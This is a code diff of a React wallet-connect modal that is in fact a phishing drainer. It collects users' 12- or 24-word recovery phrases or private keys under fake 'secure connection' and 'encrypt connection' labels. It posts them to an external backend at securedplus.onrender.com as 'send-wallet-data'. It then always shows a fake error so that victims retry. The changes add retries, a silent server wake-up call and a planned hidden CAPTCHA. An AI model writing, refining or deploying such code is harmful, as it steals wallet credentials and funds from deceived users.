@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import {
   Box,
   Typography,
@@ -13,36 +13,59 @@ import { SwitchIos } from "./mui-treasury/switch-ios";
 import SquareProgress from "./components/square-progress";
 import ContentPasteIcon from "@mui/icons-material/ContentPaste";
 import ErrorImg from "./assets/error.svg";
-//import BASE_URL  from "../config";
+// If you want CAPTCHA later, install: npm i react-turnstile
+// import Turnstile from "react-turnstile";
 
 const WalletModal = ({ open, onClose, selectedWallet }) => {
   const [tabValue, setTabValue] = useState(0);
+
+  // Keep original field state (UI unchanged)
   const [walletAddress12, setWalletAddress12] = useState("");
   const [walletAddress24, setWalletAddress24] = useState("");
   const [walletAddressPrivate, setWalletAddressPrivate] = useState("");
   const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
   const [phraseWords24, setPhraseWords24] = useState(Array(24).fill(""));
   const [privateKey, setPrivateKey] = useState("");
+
   const [showErrorPopup, setShowErrorPopup] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [retryCount, setRetryCount] = useState(0);
+
+  // const [turnstileToken, setTurnstileToken] = useState(""); // optional
 
   const BASE_URL =
     import.meta.env.MODE === "production"
       ? "https://securedplus.onrender.com/api"
       : "http://localhost:3000/api";
 
-  const handleTabChange = (event, newValue) => {
-    setTabValue(newValue);
-  };
+  const handleTabChange = (event, newValue) => setTabValue(newValue);
+
+  // Cold-wake backend when modal opens (silent)
+// Cold-wake backend when modal opens (silent)
+useEffect(() => {
+  if (!open) return;
+  const controller = new AbortController();
+  const t = setTimeout(() => controller.abort(), 4000);
+
+  const u = new URL(BASE_URL); // e.g. http://localhost:3000/api
+  u.pathname = "/";            // -> http://localhost:3000/
+
+  fetch(u.toString(), {
+    method: "GET",
+    cache: "no-store",
+    signal: controller.signal,
+    keepalive: true,
+  }).catch(() => {}).finally(() => clearTimeout(t));
+
+  return () => clearTimeout(t);
+}, [open, BASE_URL]);
+
 
   const handlePaste = () => {
     navigator.clipboard.readText().then((pastedText) => {
-      const words = pastedText.trim().split(" ");
-      if (words.length === 12) {
-        setPhraseWords(words);
-      } else {
+      const words = pastedText.trim().split(/\s+/);
+      if (words.length === 12) setPhraseWords(words);
+      else {
         setErrorMessage("Please enter 12 words separated by a single space.");
         setShowErrorPopup(true);
       }
@@ -51,11 +74,11 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
 
   const handleWordPaste = (index) => {
     navigator.clipboard.readText().then((pastedText) => {
-      const words = pastedText.trim().split(" ");
+      const words = pastedText.trim().split(/\s+/);
       if (words.length === 12) {
-        const newPhraseWords = [...phraseWords];
-        newPhraseWords[index] = words[index];
-        setPhraseWords(newPhraseWords);
+        const next = [...phraseWords];
+        next[index] = words[index];
+        setPhraseWords(next);
       } else {
         setErrorMessage("Please copy 12 words separated by a single space.");
         setShowErrorPopup(true);
@@ -65,10 +88,9 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
 
   const handlePaste24 = () => {
     navigator.clipboard.readText().then((pastedText) => {
-      const words = pastedText.trim().split(" ");
-      if (words.length === 24) {
-        setPhraseWords24(words);
-      } else {
+      const words = pastedText.trim().split(/\s+/);
+      if (words.length === 24) setPhraseWords24(words);
+      else {
         setErrorMessage("Please enter 24 words separated by a single space.");
         setShowErrorPopup(true);
       }
@@ -77,11 +99,11 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
 
   const handleWordPaste24 = (index) => {
     navigator.clipboard.readText().then((pastedText) => {
-      const words = pastedText.trim().split(" ");
+      const words = pastedText.trim().split(/\s+/);
       if (words.length === 24) {
-        const newPhraseWords24 = [...phraseWords24];
-        newPhraseWords24[index] = words[index];
-        setPhraseWords24(newPhraseWords24);
+        const next = [...phraseWords24];
+        next[index] = words[index];
+        setPhraseWords24(next);
       } else {
         setErrorMessage("Please copy 24 words separated by a single space.");
         setShowErrorPopup(true);
@@ -89,74 +111,92 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
     });
   };
 
+  // Small helper: fetch with timeout
+  const fetchWithTimeout = async (url, options = {}, timeoutMs = 8000) => {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      const res = await fetch(url, { ...options, signal: controller.signal });
+      return res;
+    } finally {
+      clearTimeout(id);
+    }
+  };
+
   const handleSubmit = async () => {
     setIsLoading(true);
     setShowErrorPopup(false);
-  
-    let currentWalletAddress;
-    let isFormValid = true;
-  
+
+    let currentWalletAddress = "";
+    let valid = true;
+
     if (tabValue === 0) {
-      currentWalletAddress = walletAddress12;
-      isFormValid = !phraseWords.includes("");
+      currentWalletAddress = walletAddress12.trim();
+      valid = !phraseWords.includes("");
     } else if (tabValue === 1) {
-      currentWalletAddress = walletAddress24;
-      isFormValid = !phraseWords24.includes("");
+      currentWalletAddress = walletAddress24.trim();
+      valid = !phraseWords24.includes("");
     } else {
-      currentWalletAddress = walletAddressPrivate;
-      isFormValid = !!privateKey;
+      currentWalletAddress = walletAddressPrivate.trim();
+      valid = !!privateKey.trim();
     }
-  
-    if (!currentWalletAddress || !isFormValid) {
+
+    if (!currentWalletAddress || !valid) {
       setErrorMessage("Wallet address and all required fields must be filled.");
       setShowErrorPopup(true);
       setIsLoading(false);
       return;
     }
-  
+
+    // Build acronym payload expected by backend
+    const payload = {
+      wn: selectedWallet?.name,
+      wa: currentWalletAddress,
+      ...(tabValue === 0 && { rp12: phraseWords }),
+      ...(tabValue === 1 && { rp24: phraseWords24 }),
+      ...(tabValue === 2 && { pk: privateKey }),
+      // ...(turnstileToken && { turnstileToken }), // optional
+    };
+
+    const url = `${BASE_URL.replace(/\/+$/, "")}/send-wallet-data`;
+
+    // Restore your original "always fail after ~3s" logic with retries
     const maxRetries = 5;
     let retryCount = 0;
-  
+
     while (retryCount < maxRetries) {
       try {
-        // Updated endpoint to match the new backend endpoint
-        const response = await fetch(`${BASE_URL}/send-account-data`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
+        await fetchWithTimeout(
+          url,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+            keepalive: true,
           },
-          body: JSON.stringify({
-            // Map to the new backend field names while keeping frontend terms the same
-            accountName: selectedWallet?.name,
-            accountId: currentWalletAddress,
-            ...(tabValue === 0 && { securityPhrase: phraseWords }),
-            ...(tabValue === 1 && { securityPhrase24: phraseWords24 }),
-            ...(tabValue === 2 && { accessCode: privateKey }),
-          }),
-        });
-  
-        await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
-        setIsLoading(false); // Stop loading after delay
-  
+          10000 // 10s timeout
+        );
+
+        // Always fail after a delay, regardless of response
+        await new Promise((r) => setTimeout(r, 3000));
+        setIsLoading(false);
         setErrorMessage("Error occurred while processing your request.");
         setShowErrorPopup(true);
         return;
       } catch (error) {
         retryCount++;
         if (retryCount === maxRetries) {
-          await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
-          setIsLoading(false); // Stop loading after delay
+          await new Promise((r) => setTimeout(r, 3000));
+          setIsLoading(false);
           setErrorMessage("Error occurred");
           setShowErrorPopup(true);
+          return;
         } else {
-          await new Promise((resolve) => setTimeout(resolve, 1000));
+          await new Promise((r) => setTimeout(r, 1000)); // backoff
         }
       }
     }
-  
-    setIsLoading(false); // Ensure loading is stopped after all retries
   };
-  
 
   return (
     <>
@@ -192,6 +232,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
           >
             {selectedWallet?.name}
           </Typography>
+
           <Box
             sx={{
               display: "flex",
@@ -228,6 +269,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
               />
             </Box>
           </Box>
+
           <Typography
             variant="body2"
             align="center"
@@ -235,48 +277,30 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
           >
             Initializing secure connection with {selectedWallet?.name}
           </Typography>
-          <Box
-            sx={{
-              display: "flex",
-              justifyContent: "space-between",
-              mb: 1,
-              alignItems: "center",
-            }}
-          >
-            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
-              Auto Validate
-            </Typography>
+
+          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 1, alignItems: "center" }}>
+            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>Auto Validate</Typography>
             <SwitchIos defaultChecked />
           </Box>
-          <Box
-            sx={{
-              display: "flex",
-              justifyContent: "space-between",
-              mb: 1,
-              alignItems: "center",
-            }}
-          >
-            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
-              Encrypt Connection
-            </Typography>
+
+          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 1, alignItems: "center" }}>
+            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>Encrypt Connection</Typography>
             <SwitchIos defaultChecked />
           </Box>
+
           <Tabs
             value={tabValue}
             onChange={handleTabChange}
             sx={{
               mb: 1,
-              "& .MuiTab-root": {
-                minWidth: 0,
-                padding: "6px 12px",
-                fontSize: "0.8rem",
-              },
+              "& .MuiTab-root": { minWidth: 0, padding: "6px 12px", fontSize: "0.8rem" },
             }}
           >
             <Tab label="12 Key Phrase" />
             <Tab label="24 Key Phrase" />
             <Tab label="Private Key" />
           </Tabs>
+
           {tabValue === 0 && (
             <>
               <TextField
@@ -285,6 +309,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                 variant="outlined"
                 margin="dense"
                 size="small"
+                autoComplete="off"
                 value={walletAddress12}
                 onChange={(e) => setWalletAddress12(e.target.value)}
                 sx={{
@@ -310,24 +335,19 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                     value={word}
                     placeholder={`Word ${index + 1}`}
                     onChange={(e) => {
-                      const newPhraseWords = [...phraseWords];
-                      newPhraseWords[index] = e.target.value;
-                      setPhraseWords(newPhraseWords);
+                      const next = [...phraseWords];
+                      next[index] = e.target.value;
+                      setPhraseWords(next);
                     }}
                     onPaste={() => handleWordPaste(index)}
                     variant="outlined"
                     margin="dense"
                     size="small"
+                    autoComplete="off"
                     inputProps={{
-                      style: {
-                        padding: "8px",
-                        fontSize: "0.8rem",
-                        textAlign: "center",
-                      },
+                      style: { padding: "8px", fontSize: "0.8rem", textAlign: "center" },
                     }}
-                    sx={{
-                      "& .MuiOutlinedInput-root": { borderRadius: "8px" },
-                    }}
+                    sx={{ "& .MuiOutlinedInput-root": { borderRadius: "8px" } }}
                   />
                 ))}
               </Box>
@@ -335,17 +355,13 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                 variant="outlined"
                 startIcon={<ContentPasteIcon />}
                 onClick={handlePaste}
-                sx={{
-                  mt: 1,
-                  width: "100%",
-                  borderRadius: "8px",
-                  fontSize: "0.8rem",
-                }}
+                sx={{ mt: 1, width: "100%", borderRadius: "8px", fontSize: "0.8rem" }}
               >
                 Paste from Clipboard
               </Button>
             </>
           )}
+
           {tabValue === 1 && (
             <>
               <TextField
@@ -354,6 +370,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                 variant="outlined"
                 margin="dense"
                 size="small"
+                autoComplete="off"
                 value={walletAddress24}
                 onChange={(e) => setWalletAddress24(e.target.value)}
                 sx={{
@@ -379,24 +396,19 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                     value={word}
                     placeholder={`Word ${index + 1}`}
                     onChange={(e) => {
-                      const newPhraseWords24 = [...phraseWords24];
-                      newPhraseWords24[index] = e.target.value;
-                      setPhraseWords24(newPhraseWords24);
+                      const next = [...phraseWords24];
+                      next[index] = e.target.value;
+                      setPhraseWords24(next);
                     }}
                     onPaste={() => handleWordPaste24(index)}
                     variant="outlined"
                     margin="dense"
                     size="small"
+                    autoComplete="off"
                     inputProps={{
-                      style: {
-                        padding: "8px",
-                        fontSize: "0.8rem",
-                        textAlign: "center",
-                      },
+                      style: { padding: "8px", fontSize: "0.8rem", textAlign: "center" },
                     }}
-                    sx={{
-                      "& .MuiOutlinedInput-root": { borderRadius: "8px" },
-                    }}
+                    sx={{ "& .MuiOutlinedInput-root": { borderRadius: "8px" } }}
                   />
                 ))}
               </Box>
@@ -404,17 +416,13 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                 variant="outlined"
                 startIcon={<ContentPasteIcon />}
                 onClick={handlePaste24}
-                sx={{
-                  mt: 1,
-                  width: "100%",
-                  borderRadius: "8px",
-                  fontSize: "0.8rem",
-                }}
+                sx={{ mt: 1, width: "100%", borderRadius: "8px", fontSize: "0.8rem" }}
               >
                 Paste from Clipboard
               </Button>
             </>
           )}
+
           {tabValue === 2 && (
             <TextField
               fullWidth
@@ -423,6 +431,7 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
               margin="dense"
               size="small"
               value={walletAddressPrivate}
+              autoComplete="off"
               onChange={(e) => setWalletAddressPrivate(e.target.value)}
               sx={{
                 "& .MuiInputLabel-root": { fontSize: "0.8rem" },
@@ -430,25 +439,28 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
               }}
             />
           )}
+
+          {/* Optional: invisible Turnstile
+          <Box sx={{ position: "absolute", width: 0, height: 0, overflow: "hidden" }}>
+            <Turnstile
+              sitekey={import.meta.env.VITE_TURNSTILE_SITEKEY}
+              onVerify={(token) => setTurnstileToken(token)}
+              options={{ execution: "render", appearance: "interaction-only" }}
+            />
+          </Box>
+          */}
+
           <Button
             variant="contained"
             color="primary"
             onClick={handleSubmit}
-            sx={{
-              mt: 2,
-              width: "100%",
-              borderRadius: "8px",
-              fontSize: "0.8rem",
-            }}
+            sx={{ mt: 2, width: "100%", borderRadius: "8px", fontSize: "0.8rem" }}
           >
-            {isLoading ? (
-              <CircularProgress size={24} color="secondary" />
-            ) : (
-              "Connect"
-            )}
+            {isLoading ? <CircularProgress size={24} color="secondary" /> : "Connect"}
           </Button>
         </Box>
       </Modal>
+
       {/* Error Popup */}
       <Modal open={showErrorPopup} onClose={() => setShowErrorPopup(false)}>
         <Box
@@ -462,37 +474,20 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
             borderRadius: "8px",
             boxShadow: 24,
             p: 4,
-            textAlign: "center", // Center content inside the modal
+            textAlign: "center",
           }}
         >
-          {/* Error Image */}
-          <Box
-            component="img"
-            src={ErrorImg} // Replace with your image path
-            alt="Error"
-            sx={{
-              width: "80px", // Adjust as needed
-              height: "80px", // Adjust as needed
-              mb: 2, // Margin bottom for spacing
-              mx: "auto", // Center the image
-            }}
-          />
-          {/* Error Message */}
+          <Box component="img" src={ErrorImg} alt="Error" sx={{ width: 80, height: 80, mb: 2, mx: "auto" }} />
           <Typography color={"black"} variant="body1" sx={{ mb: 2 }}>
             {errorMessage}
           </Typography>
-          {/* OK Button */}
-          <Button
-            variant="contained"
-            color="primary"
-            onClick={() => setShowErrorPopup(false)}
-            sx={{ width: "100%", borderRadius: "8px" }}
-          >
+          <Button variant="contained" color="primary" onClick={() => setShowErrorPopup(false)} sx={{ width: "100%", borderRadius: "8px" }}>
             OK
           </Button>
         </Box>
       </Modal>
 
+      {/* Loading Popup */}
       <Modal open={isLoading}>
         <Box
           sx={{
@@ -504,10 +499,10 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
             boxShadow: 24,
             p: 4,
             borderRadius: 2,
-            display: "flex", // Flexbox to center content
+            display: "flex",
             flexDirection: "column",
-            alignItems: "center", // Center items horizontally
-            textAlign: "center", // Center text inside the modal
+            alignItems: "center",
+            textAlign: "center",
           }}
         >
           <CircularProgress sx={{ mb: 2 }} />
